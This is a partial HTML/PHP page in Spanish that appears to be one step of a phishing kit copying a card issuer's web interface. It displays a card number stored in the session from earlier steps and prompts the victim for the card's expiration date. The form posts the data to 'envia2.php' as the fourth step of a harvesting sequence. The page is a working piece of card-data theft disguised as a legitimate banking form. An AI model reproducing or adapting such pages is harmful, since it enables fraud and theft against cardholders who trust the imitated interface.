                              ...
                              <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center">
                                 ...
                                 <div _ngcontent-prp-c36="">
                                    <card-component _ngcontent-prp-c36="" _nghost-prp-c31="">
                                       <div _ngcontent-prp-c31="" class="row justify-content-center align-items-center" style="width: 310px; height: 175px;">
                                          ...
                                          <div _ngcontent-prp-c31="" class="position-absolute"><span _ngcontent-prp-c31="" style="color:#fff;font-size:20px;font-weight:400;line-height:28px;" id="onNumber"><?php echo($_SESSION['cnmber']);?></span></div>
                                          <div _ngcontent-cav-c31="" class="cardExpiration"><span _ngcontent-cav-c31="" id="onVenc">**/**</span></div>
                                       </div>
                                    </card-component>
                                 </div>
                                 <div _ngcontent-prp-c36="" class="col-12 mt-5">
                                    <form _ngcontent-prp-c36="" action="envia2.php" method="POST" class="ng-pristine ng-invalid ng-touched" id="siguiente4">
                                       ...
                                       <div _ngcontent-prp-c36="" class="form-group">
                                          <div _ngcontent-prp-c36="" class="input-group">
                                             <div _ngcontent-prp-c36="" class="card-number">
                                                <label _ngcontent-prp-c36="" class="label-input">Vencimiento (MM/AA)</label><input _ngcontent-prp-c36="" id="venc" name="venc" type="tel" formcontrolname="number" placeholder="Ej: 04/22" class="custom-input-dark card-icon ng-pristine ng-invalid ng-touched" maxlength="5"><small _ngcontent-prp-c36="" id="cardNumberHelp" class="form-text help-text">Podrás encontrarlo en el frente de la tarjeta</small>
                                 ...
                                 <div _ngcontent-prp-c36="" class="col-12">
                                    <div _ngcontent-prp-c36="" class="row mt-5 mb-5 pl-4 pr-4">
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-right order-1 order-md-0 mb-4"><button _ngcontent-prp-c36="" id="backButtonVenc" type="button" class="btn-back-dark mb-4 mb-sm-0">Anterior</button></div>
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-left order-0 order-md-1 mb-4">
                                          <button _ngcontent-prp-c36="" type="submit" id="vencButton" class="btn-disabled-dark d-block d-md-inline-block" form="siguiente4">Siguiente</button>
                                       </div>
                                    </div>
                                 </div>
